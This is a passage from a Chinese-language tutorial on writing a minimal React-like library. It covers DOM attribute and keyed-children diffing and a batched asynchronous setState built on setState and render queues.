&#123;</span><br><span class="line">        <span class="comment">// 如果组件类型变化,则移除掉原来组件,并渲染新组件</span></span><br><span class="line">        <span class="comment">// 移除</span></span><br><span class="line">        <span class="keyword">if</span> (comp) &#123;</span><br><span class="line">            <span class="title function_">unmountComponent</span>(comp);</span><br><span class="line">            comp = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//核心代码</span></span><br><span class="line">        <span class="comment">// 1.创建新组件</span></span><br><span class="line">        comp = <span class="title function_">createComponent</span>(vnode.<span class="property">tag</span>, vnode.<span class="property">attrs</span>);</span><br><span class="line">        <span class="comment">// 2.设置组件属性</span></span><br><span class="line">        <span class="title function_">setComponentProp</span>(comp, vnode.<span class="property">attrs</span>);</span><br><span class="line">        dom = comp.<span class="property">base</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dom;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-5-对比非文本DOM节点"><a href="#5-5-对比非文本DOM节点" class="headerlink" title="5.5 对比非文本DOM节点"></a>5.5 对比非文本DOM节点</h2><p>如果vnode表示的是一个非文本DOM节点,分两种情况分析:</p><p>情况一: 如果真实DOM不存在,表示此节点是新增的</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!dom)&#123;</span><br><span class="line">    updateDOM = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(vnode.<span class="property">tag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>情况二:如果真实DOM存在,需要<code>对比属性</code>和<code>对比子节点</code></p><h3 id="5-5-1-对比属性"><a href="#5-5-1-对比属性" class="headerlink" title="5.5.1 对比属性"></a>5.5.1 对比属性</h3><p>找出来节点的属性以及事件监听的变化 单独起一个<code>diffAttributes</code>方法</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置属性和移除属性的时候 使用到了此方法.注意:移除属性 只需要设置属性值为undefined就可以</span></span><br><span class="line"><span class="keyword">import</span> &#123; setAttribute &#125; <span class="keyword">from</span> <span class="string">&#x27;./index&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">diffNode</span>(<span class="params">dom,vnode</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> out = dom;</span><br><span class="line">  <span class="comment">//  ....</span></span><br><span class="line">    <span class="comment">// 如果是非文本DOM节点</span></span><br><span class="line">    <span class="comment">// 真实DOM不存在</span></span><br><span class="line">    <span class="keyword">if</span>(!dom)&#123;</span><br><span class="line">      out = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(vnode.<span class="property">tag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// 如果真实DOM存在,需要对比属性和对比子节点</span></span><br><span class="line">    <span class="title function_">diffAttributes</span>(out,vnode);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">diffAttributes</span>(<span class="params">dom, vnode</span>) &#123;</span><br><span class="line">    <span class="comment">// 保存之前的真实DOM的所有属性</span></span><br><span class="line">    <span class="keyword">const</span> oldAttrs = &#123;&#125;;</span><br><span class="line">    <span class="keyword">const</span> newAttrs = vnode.<span class="property">attrs</span>; <span class="comment">//虚拟DOM的属性 (也是最新的属性)</span></span><br><span class="line">    <span class="comment">// 获取真实DOM属性</span></span><br><span class="line">    <span class="keyword">const</span> domAttrs = dom.<span class="property">attributes</span>;</span><br><span class="line">    <span class="comment">// const domAttrs =  document.querySelector(&#x27;#root&#x27;).attributes;</span></span><br><span class="line">    [...domAttrs].<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        oldAttrs[item.<span class="property">name</span>] = item.<span class="property">value</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 比较</span></span><br><span class="line">    <span class="comment">// 如果原来的属性不在新的属性当中,则将其移除掉  (属性值直接设置undefined)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> oldAttrs) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(key <span class="keyword">in</span> newAttrs)) &#123;</span><br><span class="line">            <span class="comment">// 移除</span></span><br><span class="line">            <span class="title function_">setAttribute</span>(dom, key, <span class="literal">undefined</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 更新新的属性值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> newAttrs) &#123;</span><br><span class="line">        <span class="keyword">if</span> (oldAttrs[key] !== newAttrs[key]) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(dom, newAttrs[key], key);</span><br><span class="line">            <span class="comment">// 只更值不相等的属性</span></span><br><span class="line">            <span class="title function_">setAttribute</span>(dom, key, newAttrs[key]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-5-2-对比子节点"><a href="#5-5-2-对比子节点" class="headerlink" title="5.5.2 对比子节点"></a>5.5.2 对比子节点</h3><p>节点对比完成之后,接下来对比它的子节点</p><p>这个时候会有一个问题,前面我们实现的不同的diff算法,都是明确知道哪一个是真实DOM和虚拟DOM对比,但是子节点childrens是一个数组,他们可能改变顺序,或者数量有所变化,我们很难确定是和虚拟DOM对比的是哪一个?</p><blockquote><p>思路:给节点设置一个key值,重新渲染时对比key值相同的节点,这样我们就能找到真实DOM和哪个虚拟DOM进行对比了</p></blockquote><p>对比子节点的方法有点复杂,在这里理解一下原理</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">diffNode</span>(<span class="params">dom,vnode</span>)&#123;</span><br><span class="line">     <span class="keyword">if</span> (vnode.<span class="property">childrens</span> &amp;&amp; vnode.<span class="property">childrens</span>.<span class="property">length</span> &gt; <span class="number">0</span> || (out.<span class="property">childNodes</span> &amp;&amp; out.<span class="property">childNodes</span>.<span class="property">length</span> &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="title function_">diffChildren</span>(out, vnode.<span class="property">childrens</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">diffChildren</span>(<span class="params">dom, vchildren</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> domChildren = dom.<span class="property">childNodes</span>;</span><br><span class="line">  <span class="keyword">const</span> children = [];</span><br><span class="line">  <span class="keyword">const</span> keyed = &#123;&#125;;</span><br><span class="line">  <span class="comment">// 将有key的节点(用对象保存)和没有key的节点(用数组保存)分开</span></span><br><span class="line">  <span class="keyword">if</span> (domChildren.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    [...domChildren].<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 获取key</span></span><br><span class="line">      <span class="keyword">const</span> key = item.<span class="property">key</span>;</span><br><span class="line">      <span class="keyword">if</span> (key) &#123;</span><br><span class="line">        <span class="comment">// 如果key存在,保存到对象中</span></span><br><span class="line">        keyed[key] = item;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果key不存在,保存到数组中</span></span><br><span class="line">        children.<span class="title function_">push</span>(item);<span class="string">``</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (vchildren &amp;&amp; vchildren.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> min = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> childrenLen = children.<span class="property">length</span>; <span class="comment">//2</span></span><br><span class="line">    [...vchildren].<span class="title function_">forEach</span>(<span class="function">(<span class="params">vchild, i</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 获取虚拟DOM中所有的key</span></span><br><span class="line">      <span class="keyword">const</span> key = vchild.<span class="property">key</span>;</span><br><span class="line">      <span class="keyword">let</span> child;</span><br><span class="line">      <span class="keyword">if</span> (key) &#123;</span><br><span class="line">        <span class="comment">// 如果有key,找到对应key值的节点</span></span><br><span class="line">        <span class="keyword">if</span> (keyed[key]) &#123;</span><br><span class="line">          child = keyed[key];</span><br><span class="line">          keyed[key] = <span class="literal">undefined</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childrenLen &gt; min) &#123;</span><br><span class="line">        <span class="comment">// 如果没有key,则优先找类型相同的节点</span></span><br><span class="line">        <span class="comment">// 遍历所有真实节点的子节点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = min; j &lt; childrenLen; j++) &#123;</span><br><span class="line">          <span class="keyword">let</span> c = children[j];</span><br><span class="line">          <span class="keyword">if</span> (c) &#123;</span><br><span class="line">            child = c;</span><br><span class="line">            children[j] = <span class="literal">undefined</span>;</span><br><span class="line">            <span class="keyword">if</span> (j === childrenLen - <span class="number">1</span>) &#123;</span><br><span class="line">              childrenLen--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j === min) &#123;</span><br><span class="line">              min++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对比</span></span><br><span class="line">      child = <span class="title function_">diffNode</span>(child, vchild);</span><br><span class="line">      <span class="comment">// 更新DOM</span></span><br><span class="line">      <span class="keyword">const</span> f = domChildren[i];</span><br><span class="line">      <span class="keyword">if</span> (child &amp;&amp; child !== dom &amp;&amp; child !== f) &#123;</span><br><span class="line">        <span class="comment">// 如果更新前的对应位置为空，说明此节点是新增的</span></span><br><span class="line">        <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">          dom.<span class="title function_">appendChild</span>(child);</span><br><span class="line">          <span class="comment">// 如果更新后的节点和更新前对应位置的下一个节点一样，说明当前位置的节点被移除了</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (child === f.<span class="property">nextSibling</span>) &#123;</span><br><span class="line">          dom.<span class="title function_">removeChild</span>(f);</span><br><span class="line">          <span class="comment">// 将更新后的节点移动到正确的位置</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 注意insertBefore的用法，第一个参数是要插入的节点，第二个参数是已存在的节点</span></span><br><span class="line">          dom.<span class="title function_">insertBefore</span>(child, f);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个流程如下：</p><p><img src="https://i.loli.net/2021/04/24/ZH2CcJqKeiDtBu3.png" alt=""></p><p>最后再修改<code>renderComponent</code>方法的两个地方</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  export function renderComponent(comp) &#123;</span><br><span class="line"><span class="addition">+   let base</span></span><br><span class="line">    // 对组件进行渲染，获取虚拟节点对象</span><br><span class="line">    const renderer = comp.render();</span><br><span class="line"><span class="deletion">-   let base = _render(renderer);</span></span><br><span class="line"></span><br><span class="line">    if (comp.base) &#123;</span><br><span class="line">      // 组件更新时引发重新渲染</span><br><span class="line">      comp?.componentWillUpdate(comp.props, comp.state);</span><br><span class="line"><span class="addition">+     base = diffNode(comp.base,renderer);</span></span><br><span class="line">      comp.base = base;</span><br><span class="line"><span class="addition">+     comp?.componentDidUpdate();</span></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      // 初次渲染</span><br><span class="line"><span class="addition">+     base = _render(renderer);</span></span><br><span class="line">      comp.base = base;</span><br><span class="line">      comp?.componentDidMount();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-   // 组件 state 发生变化后，重新渲染节点，需要进行节点替换</span></span><br><span class="line"><span class="deletion">-   if (comp?.base?.parentNode) &#123;</span></span><br><span class="line"><span class="deletion">-     comp.base.parentNode.replaceChild(base, comp.base);</span></span><br><span class="line"><span class="deletion">-     comp?.componentDidUpdate();</span></span><br><span class="line"><span class="deletion">-   &#125;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="6-异步-setState"><a href="#6-异步-setState" class="headerlink" title="6. 异步 setState"></a>6. 异步 setState</h1><p>在 React 中，为了优化性能 <code>setState</code> 的操作是异步的，当我们在一个 for 循环中直行 setState，会出现以下情况：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="variable language_">super</span>(props);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">    <span class="attr">num</span>: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="title function_">componentDidMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">num</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">num</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">num</span> + <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果始终为初始化的 state 值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 且最终 state.num 的值为 1</span></span><br></pre></td></tr></table></figure><p>同时 <code>setState</code> 也支持传入一个函数，在该函数中，可以获取到上一次更新 state 后的状态（prevState）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="variable language_">super</span>(props);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">    <span class="attr">num</span>: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="title function_">componentDidMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(<span class="function">(<span class="params">prevState</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(prevState.<span class="property">num</span>);       </span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        num : prevState.<span class="property">num</span> + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果可以获取到每次 state 改变前的值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 且最终 state.num 的值为 5</span></span><br></pre></td></tr></table></figure><p>之所以会这样，是因为 <code>setState</code> 始终是一个异步的操作，此时在循环中取到的 state 都是在循环执行时获取到的组件 state。但是 <code>setState</code> 中如果传入一个函数，那么在函数中可以获取到上次组件更新的 prevState，也就是在传入函数执行时，组件最新的 state，这的确很神奇。</p><p>那么知道的上述的具体表现后，我们再来探讨一下为什么 <code>setState</code> 要是一个异步操作，其是怎么优化的，其主要分如下几步：</p><ol><li>当 react 进行 setState 操作时，会重新渲染组件，渲染组件会消耗大量的性能，为了减少性能损耗，react 会将 <strong>当前同步任务队列</strong> 中的所有 setState 操作都暂存在一个 <strong>执行队列</strong> 中，我们将其定为 <code>setStateQueue</code>，但并不立即执行。同时创建一个 <strong>渲染队列</strong>，将要改变 state 的组件全部存放在渲染队列中，同时 <strong>合并渲染队列中重复的组件</strong>；</li><li>等待一段时间过后，react 会将直行队列 <code>setStateQueue</code> 中的 setState 操作，但此时只会改组件的 state ，组件并没有直行实质性的渲染；</li><li>等 <code>setStateQueue</code> 队列执行完毕之后，开始对渲染队列 <code>renderQueue</code> 的组件直行渲染操作，这样就可以实现改变多个 state 但只渲染一次，从而优化性能。</li></ol><p><img src="https://i.loli.net/2021/05/15/RUuTtpSdBAfiv74.jpg" alt="整体流程"></p><h2 id="6-1-创建-setStateQueue-与-renderQueue"><a href="#6-1-创建-setStateQueue-与-renderQueue" class="headerlink" title="6.1 创建 setStateQueue 与 renderQueue"></a>6.1 创建 setStateQueue 与 renderQueue</h2><p><code>setStateQueue</code> 负责存储该轮更新时执行的 setState 操作，<code>renderQueue</code> 负责存储在该轮更新后应该渲染的组件。我们要创建这两个队列，并创建加入队列的方法 <code>enqueueSetState(stateChange, component)</code>，并在组件更新 state 时调用该方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set_state_queue.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> setStateQueue = [];</span><br><span class="line"><span class="keyword">const</span> renderQueue = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">enqueueSetState</span>(<span class="params">stateChange, component</span>) &#123;</span><br><span class="line">  <span class="comment">// 1. 将改变 state 的操作添加到 setStateQueue 中</span></span><br><span class="line">  setStateQueue.<span class="title function_">push</span>(&#123;</span><br><span class="line">    stateChange,</span><br><span class="line">    component,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. 将需要改变 state 并渲染的组件添加到 renderQueue 中</span></span><br><span class="line">  <span class="comment">// 此时会直行一个去重操作，如果 renderQueue 里没有当前组件，才添加到队列中</span></span><br><span class="line">  <span class="keyword">let</span> r = renderQueue.<span class="title function_">some</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> item === component;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (!r) &#123;</span><br><span class="line">    renderQueue.<span class="title function_">push</span>(component);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// component.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; enqueueSetState &#125; <span class="keyword">from</span> <span class="string">&quot;./set_state_queue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">props</span> = props;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">setState</span>(<span class="params">stateChange</span>) &#123;</span><br><span class="line">    <span class="comment">// 旧方法：每次更新 state 都直行渲染组件的操作</span></span><br><span class="line">    <span class="comment">// Object.assign(this.state, stateChange);</span></span><br><span class="line">    <span class="comment">// renderComponent(this);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新方法：每次更新 state 都调用 enqueueSetState 方法，并将 stateChange 与组件传入该方法，让其负责判断组件更新的时机</span></span><br><span class="line">    <span class="title function_">enqueueSetState</span>(stateChange, <span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Component</span>;</span><br></pre></td></tr></table></figure><h2 id="6-2-创建清空队列的方法"><a href="#6-2-创建清空队列的方法" class="headerlink" title="6.2 创建清空队列的方法"></a>6.2 创建清空队列的方法</h2><p>假设我们已经等待了 <strong>一定的时间</strong>，到达了某一时刻，那么我们就要清空 setStateQueue 与 renderQueue 了。因此我们要创建一个清空队列的方法，将其命名为 flush：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set_state_queue.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 清空队列</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">flush</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> item;</span><br><span class="line">  <span class="comment">// 遍历state</span></span><br><span class="line">  <span class="keyword">while</span> ((item = setStateQueue.<span class="title function_">shift</span>())) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; stateChange, component &#125; = item;</span><br><span class="line">    <span class="comment">// 如果没有prevState,则将当前的state作为初始的prevState</span></span><br><span class="line">    <span class="keyword">if</span> (!component.<span class="property">prevState</span>) &#123;</span><br><span class="line">      component.<span class="property">prevState</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, component.<span class="property">state</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果stateChange是一个方法,也就是setState的第一种形式</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> stateChange === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">assign</span>(</span><br><span class="line">        component.<span class="property">state</span>,</span><br><span class="line">        <span class="title function_">stateChange</span>(component.<span class="property">prevState</span>, component.<span class="property">props</span>)</span><br><span class="line">      );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 如果stateChange是一个对象,则直接合并到setState中</span></span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">assign</span>(component.<span class="property">state</span>, stateChange);</span><br><span class="line">    &#125;</span><br><span class="line">    component.<span class="property">prevState</span> = component.<span class="property">state</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历组件</span></span><br><span class="line">  <span class="keyword">let</span> component;</span><br><span class="line">  <span class="keyword">while</span> ((component = renderQueue.<span class="title function_">shift</span>())) &#123;</span><br><span class="line">    <span class="title function_">renderComponent</span>(component);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该清空队列的方法实际上就是实现了我们前面原理分析的第 2 与第 3 步操作：</p><p><img src="https://i.loli.net/2021/05/15/ZCkT1yIizLpEmND.jpg" alt=""></p><h2 id="6-3-寻找合适的更新时机"><a href="#6-3-寻找合适的更新时机" class="headerlink" title="6.3 寻找合适的更新时机"></a>6.3 寻找合适的更新时机</h2><p>前面我们一直在强调 setState 是一个异步操作，其原因就在这儿，我们虽然将所有的 setState 